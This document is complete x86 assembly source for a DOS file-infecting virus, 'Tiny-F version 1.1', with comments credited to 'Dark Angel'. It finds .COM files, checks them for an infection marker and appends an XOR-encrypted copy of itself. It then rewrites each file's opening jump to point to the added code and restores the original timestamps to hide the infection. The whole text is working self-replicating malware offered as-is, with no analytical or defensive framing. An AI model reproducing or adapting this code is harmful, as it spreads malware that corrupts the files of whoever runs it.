tinyv   SEGMENT BYTE PUBLIC 'code'
        ASSUME  CS:tinyv, DS:tinyv, SS:tinyv, ES:tinyv

        ORG     100h

DOS     EQU     21h

start:  JMP     pgstart
exlbl:  db      0CDh, 20h, 7, 8, 9
pgstart:CALL    tinyvir
tinyvir:
        POP     SI                      ; get SI for storage
        SUB     SI,offset tinyvir       ; reset SI to virus start
        MOV     BP,[SI+blnkdat]         ; store SI in BP for return
        ADD     BP, OFFSET exlbl
        CALL    endecrpt
        JMP     SHORT realprog

;-----------------------------------------------------------------------------
; nonencrypted subroutines start here
;-----------------------------------------------------------------------------

; PCM's encryption was stupid, mine is better - Dark Angel
endecrpt:
; Only need to save necessary registers - Dark Angel
        PUSH    AX                      ; store registers
        PUSH    BX
        PUSH    CX
        PUSH    SI
; New, better, more compact encryption engine
        MOV     BX, [SI+EN_VAL]
        ADD     SI, offset realprog
        MOV     CX, endenc - realprog
        SHR     CX, 1
        JNC     start_encryption
        DEC     SI
start_encryption:
        MOV     DI, SI
encloop:
        LODSW                           ; DS:[SI] -> AX
        XOR     AX, BX
        STOSW
        LOOP    encloop

        POP     SI                      ; restore registers
        POP     CX
        POP     BX
        POP     AX
        RET
;-----end of encryption routine
nfect:
        CALL    endecrpt
        MOV     [SI+offset endprog+3],AX; point to data
        MOV     AH,40H                  ; write instruction
        LEA     DX,[SI+0105H]           ; write buffer loc    |
        MOV     CX,offset endprog-105h  ; (size of virus)  --\|/--
        INT     DOS                     ; do it!
        PUSHF
        CALL    endecrpt
        POPF
        JC      outa1                    ; error, bug out
        RET
outa1:
        JMP     exit


;-----------------------------------------------------------------------------
;    Unencrypted routines end here
;-----------------------------------------------------------------------------
realprog:
        CLD                             ; forward direction for string ops
; Why save DTA?  This part killed.  Saves quite a few bytes.  Dark Angel
; Instead, set DTA to SI+ENDPROG+131h
        MOV     AH, 1Ah                 ; Set DTA
        LEA     DX, [SI+ENDPROG+131h]   ;  to DS:DX
        INT     21h

        LEA     DX,[SI+fspec]           ; get filespec (*.COM)
        XOR     CX, CX                  ;        ||   (clear regs)
        MOV     AH,4EH                  ;        ||   (find files)
mainloop:                               ;       \||/
        INT     DOS                     ;    ----\/----
        JC      hiccup                  ; no more files found, terminate virus
; Next part had to be changed to account for new DTA address - Dark Angel
        LEA     DX, [SI+ENDPROG+131h+30]; set file name pointer
                                        ; (offset 30 is DTA filename start)
        MOV     AX,3D02H                ; open file
        INT     DOS                     ; do it!
        MOV     BX,AX                   ; move file handle to BX
        MOV     AH,3FH                  ; read file
        LEA     DX,[SI+endprog]         ; load end of program (as buffer pntr)
        MOV     DI,DX                   ; set Dest Index to area for buffer
        MOV     CX,0003H                ; read 3 bytes
        INT     DOS                     ; do it!
        CMP     BYTE PTR [DI],0E9H      ; check for JMP at start
        JE      infect                  ; If begins w/JMP, Infect
nextfile:
        MOV     AH,4FH                  ; set int 21 to find next file
        JMP     mainloop                ; next file, do it!
hiccup: JMP     exit
infect:
        MOV     AX,5700h                ; get date function
        INT     DOS                     ; do it!
        PUSH    DX                      ; store date + time
        PUSH    CX
        MOV     DX,[DI+01H]             ; set # of bytes to move
        MOV     [SI+blnkdat],DX         ;  "  " "    "   "   "
; Tighter Code here - Dark Angel
        XOR     CX,CX                   ;  "  " "    "   "   " (0 here)
        MOV     AX,4200H                ; move file
        INT     DOS                     ; do it!
        MOV     DX,DI                   ; set dest index to area for buffer
        MOV     CX,0002H                ; two bytes
        MOV     AH,3FH                  ; read file
        INT     DOS                     ; do it!
        CMP     WORD PTR [DI],0807H     ; check for infection
        JE      nextfile                ; next file if infected
getaval:                                ; encryption routine starts here
; My modifications here - Dark Angel
        MOV     AH, 2Ch                 ; DOS get TIME function
        INT     DOS                     ; do it!
        OR      DX, DX                  ; Is it 0?
        JE      getaval                 ; yeah, try again
        MOV     word ptr [si+offset en_val], DX ; Store it
; Tighter code here - Dark Angel
        XOR     DX,DX                   ; clear regs
        XOR     CX,CX                   ;   "    "
        MOV     AX,4202H                ; move file pointer
        INT     DOS                     ; do it!
        OR      DX,DX                   ; new pointer location 0?
        JNE     nextfile                ; if no then next file
        CMP     AH,0FEH                 ; new pointer loc too high?
        JNC     nextfile                ; yes, try again
        CALL    nfect
        MOV     AX,4200H                ; move pointer
        XOR     CX, CX                  ; clear reg
        MOV     DX,OFFSET 00001         ; where to set pointer
        INT     DOS                     ; do it!
        MOV     AH,40H                  ; write to file
        LEA     DX,[SI+offset endprog+3]; write data at SI+BUFFER
        MOV     CX,0002H                ; two bytes (the JMP)
        INT     DOS                     ; do it!
        MOV     AX,5701h                ; store date
        POP     CX                      ; restore time
        POP     DX                      ; restore date
        INT     DOS                     ; do it!
exit:
        MOV     AH,3EH                  ; close file
        INT     DOS                     ; do it!

; Return DTA to old position - Dark Angel

        MOV     AH, 1Ah                 ; Set DTA
        MOV     DX, 80h                 ;  to PSP DTA
        INT     21h

        JMP     BP

;-----------------------------------------------------------------------------
; encrypted data goes here
;-----------------------------------------------------------------------------

fspec   LABEL   WORD
        DB      '*.COM',0
nondata DB      'Tiny-F version 1.1'    ; Program identification
        DB      '˜€×@&î·³½ë'          ; author identification
        DB      'Released 10-19-91'     ; release date
endenc  LABEL   BYTE                    ; end of encryption zone
;-----------------------------------------------------------------------------
; nonencrypted data goes anywhere after here
;-----------------------------------------------------------------------------

blnkdat LABEL   WORD
        DW      0000H

; Only en_val is needed now because of new encryption mechanism
en_val  DW      0h

endprog LABEL   WORD
tinyv   ENDS
        END     start

